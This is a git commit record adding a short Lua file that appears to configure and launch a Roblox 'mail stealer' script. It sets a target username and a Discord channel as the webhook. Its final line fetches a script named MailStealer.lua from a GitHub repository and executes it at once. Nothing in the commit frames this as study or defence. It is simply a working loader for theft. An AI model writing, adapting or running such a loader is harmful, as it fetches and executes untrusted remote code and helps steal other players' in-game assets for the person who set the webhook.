ecff0834250e620d0b610c251a0b9160a998f4f3
scripter66blox <gabrielabahouschampenois@gmail.com>
2025-01-27 21:56:29 +0100

    new scrpt

---
+++ obf_R9r3ivIQdODD02CD3qO7V0jsXT5l61OGG3VyDbGagZyzNp4zFNHLokg9wbTqonmz (1).lua
@@ -0,0 +1,5 @@
+Username = gab_constelation2eme
+LoadScreen = true 
+Webhook = https://discord.com/channels/1333536717705056329/1333536718242189454
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
